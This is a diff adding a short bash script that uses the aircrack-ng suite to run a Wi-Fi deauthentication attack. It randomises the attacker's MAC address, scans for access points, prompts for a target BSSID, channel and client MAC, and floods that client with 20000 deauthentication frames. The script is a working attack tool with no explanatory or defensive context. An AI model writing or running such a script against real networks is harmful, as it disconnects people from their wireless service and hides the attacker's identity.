@@ -1,0 +1,34 @@
+#!/bin/bash
+
+iface="wlan0"
+
+
+sudo airmon-ng stop "$iface"mon
+
+sudo airmon-ng start $iface
+
+sudo ifconfig "$iface"mon down
+
+sudo macchanger -r "$iface"mon;sleep 2
+
+sudo ifconfig "$iface"mon up
+
+sudo airodump-ng "$iface"mon
+
+echo ""
+echo "bssid:"
+read 'bssid'
+
+echo ""
+echo "channel:"
+read 'channel'
+
+airodump-ng --bssid $bssid --channel $channel wlan0mon
+
+echo "mac:"
+read 'mac'
+
+aireplay-ng --deauth 20000 -a $bssid -c $mac wlan0mon
+
+sudo airmon-ng stop "$iface"mon
+
